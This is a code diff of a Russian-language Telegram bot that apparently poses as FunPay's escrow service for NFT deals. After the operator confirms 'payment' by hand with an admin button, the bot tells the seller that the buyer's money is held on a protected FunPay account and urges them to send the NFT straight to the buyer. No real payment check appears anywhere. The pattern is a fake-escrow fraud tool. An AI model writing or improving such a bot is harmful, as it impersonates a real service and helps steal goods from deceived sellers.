@@ -29,7 +29,6 @@ class CreateDeal(StatesGroup):
 
 # --- ГЕНЕРАТОР РАНДОМНОГО ID ---
 def gen_id():
-    # Генерируем случайное число от 1000 до 9999
     return f"FUN-{random.randint(1000, 9999)}"
 
 # --- ГЛАВНОЕ МЕНЮ ---
@@ -218,7 +217,6 @@ async def process_nft(message: Message, state: FSMContext):
     bot_info = await bot.get_me()
     link = f"https://t.me/{bot_info.username}?start=deal_{d_id}"
     
-    # Сообщение продавцу (создание)
     await msg.edit_text(
         f"✅ <b>Сделка {d_id} успешно создана!</b>\n\n"
         f"📄 <b>Детали сделки:</b>\n"
@@ -230,7 +228,6 @@ async def process_nft(message: Message, state: FSMContext):
         parse_mode="HTML"
     )
     
-    # УВЕДОМЛЕНИЕ АДМИНУ (ТЕБЕ)
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"confirm_pay_{d_id}")]
     ])
@@ -301,19 +298,16 @@ async def confirm_pay(call: CallbackQuery):
     deal = active_deals.get(d_id)
     deal["status"] = "paid"
     
-    await call.message.edit_text(f"✅ Оплата по сделке {d_id} подтверждена. Сделка переведена в статус «Ожидает передачи NFT».")
+    await call.message.edit_text(f"✅ Оплата по сделке {d_id} подтверждена.")
     
-    # Солидное сообщение продавцу
+    # ТЕКСТ БЕЗ ЗАГОЛОВКОВ И ИНСТРУКЦИЙ
     seller_text = (
-        f"🛡 <b>СИСТЕМА БЕЗОПАСНЫХ СДЕЛОК FUNPAY</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"✅ <b>Средства по сделке {d_id} получены и зарезервированы!</b>\n\n"
         f"📄 <b>Детали транзакции:</b>\n"
         f"├ Покупатель: @{call.from_user.username}\n"
         f"├ Сумма к зачислению: <b>{deal['amount']} RUB</b>\n"
         f"├ Комиссия сервиса (3%): <i>Удержана автоматически</i>\n"
         f"└ Товар: {deal['nft_link']}\n\n"
-        f"⚠️ <b>Инструкция для Продавца:</b>\n"
         f"Покупатель успешно перевел средства. Деньги находятся на защищенном счете FunPay.\n\n"
         f"<b>Передайте указанный NFT напрямую покупателю.</b> После того как вы передадите подарок, нажмите кнопку ниже. Наш алгоритм проверит передачу, и средства моментально поступят на ваши реквизиты ({deal['bank_name']}).\n\n"
         f"<i>Внимание: не передавайте NFT, пока не убедитесь, что это тот самый покупатель.</i>"
